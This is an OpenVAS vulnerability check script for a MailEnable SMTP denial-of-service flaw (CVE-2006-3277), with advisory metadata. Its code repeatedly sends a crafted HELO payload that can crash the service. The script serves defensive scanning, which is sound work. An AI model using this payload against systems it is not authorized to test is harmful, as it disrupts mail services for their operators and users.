###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mailenable_smtp_helo_cmd_dos.nasl 4690 2016-12-06 14:44:58Z cfi $
#
# MailEnable SMTP HELO Command Denial of Service Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802914");
  script_version("$Revision: 4690 $");
  script_cve_id("CVE-2006-3277");
  script_bugtraq_id(18630);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-12-06 15:44:58 +0100 (Tue, 06 Dec 2016) $");
  script_tag(name:"creation_date", value:"2012-07-12 17:17:25 +0530 (Thu, 12 Jul 2012)");
  script_name("MailEnable SMTP HELO Command Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("SMTP problems");
  script_dependencies("find_service_3digits.nasl");
  script_require_ports("Services/smtp", 25);

  script_xref(name:"URL", value:"http://www.mailenable.com/");
  script_xref(name:"URL", value:"http://secunia.com/advisories/20790");
  script_xref(name:"URL", value:"http://securitytracker.com/id?1016376");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/27387");
  script_xref(name:"URL", value:"http://www.mailenable.com/hotfix/default.asp");

  tag_impact = "Successful exploitation could allow remote attackers to crash the service
  by sending HELO command with specially crafted arguments.

  Impact Level: Application";

  tag_affected = "MailEnable Standard version 1.92 and prior
  MailEnable Enterprise version 2.0 and prior
  MailEnable Professional version 2.0 and prior";

  tag_insight = "MailEnable SMTP service fails to handle the HELO command. This can be
  exploited to crash the service via a HELO command with specially crafted
  arguments.";

  tag_solution = "Upgrade MailEnable version 6 or later,
  For updates refer to http://www.mailenable.com/";

  tag_summary = "This host is running MailEnable and is prone to denial of service
  vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


include("smtp_func.inc");

## Variable Initialization
port = "";
banner = "";
soc = "";

## SMTP Port
port = get_kb_item("Services/smtp");
if(! port) {
  port = 25;
}

## Check the port state
if(!get_port_state(port)){
  exit(0);
}

## Get SMTP banner
banner = get_smtp_banner(port:port);
if(!banner ||
   !egrep(pattern:"Mail(Enable| Enable SMTP) Service", string:banner)){
  exit(0);
}

# Crafted data
data = 'HELO \0x41\r\n';

for (i=1; i<= 100; i++)
{
  # Open the socket
  soc = open_sock_tcp(port);

  if (soc)
  {
    j = 0;
    ## Send the crafted data
    send(socket:soc, data:data);
    close(soc);
  }
  else
  {
    sleep(1);
    ## if it fails to connect 3 consecutive times.
    if (++j > 2)
    {
      security_message(port);
      exit(0);
    }
  }
}
